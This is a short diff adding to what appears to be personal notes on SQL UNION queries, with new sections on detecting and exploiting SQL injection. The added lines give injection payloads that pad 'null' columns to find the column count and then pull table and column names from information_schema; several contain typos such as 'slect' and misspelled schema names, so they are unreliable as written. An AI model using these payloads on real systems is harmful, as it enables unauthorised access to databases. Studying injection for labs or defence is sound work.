@@ -85,6 +85,20 @@ SELECT * FROM ships;
 SELECT * FROM ports UNION SLECT * FROM ships;
 # Combines the entries from the first 2 statements
 ```
+### Detection
+1. Find a successful query
+2. Start adding 'null' columns until you no long recieve an errors
+jeremy' union slect null,null,null#
+3. Once you find the the correct number of columns, you can begin filling them with data.
+
+### Useful recon once you've found the correct number of columns
+> These will be helpful in crafting your query's to get useful results
+1. Find all of the table names
+jeremy' union select null,null,table_name from information_schema.table#
+
+2. Find all of the column names
+jeremy' union select null,null,column_name from information_schema.column#
+
 ### Even Columns
 Assuming the products table only has 2 columns
 ```sql
